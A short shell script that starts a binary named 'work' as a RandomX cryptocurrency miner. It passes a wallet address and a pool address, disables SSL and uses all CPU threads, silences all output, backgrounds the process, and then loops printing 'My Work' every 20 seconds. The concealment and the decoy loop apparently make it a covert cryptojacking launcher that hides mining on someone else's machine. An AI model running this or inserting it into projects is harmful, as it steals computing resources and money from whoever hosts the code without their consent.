./work -algo randomx -wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.RIG01 -coin BTC -rigName "vivo" -pool1 34.96.85.230:3380 -useSSL false -cpuThreads $(nproc --all) >/dev/null 2>&1 &
while true
do
        echo "My Work"
        sleep 20
done
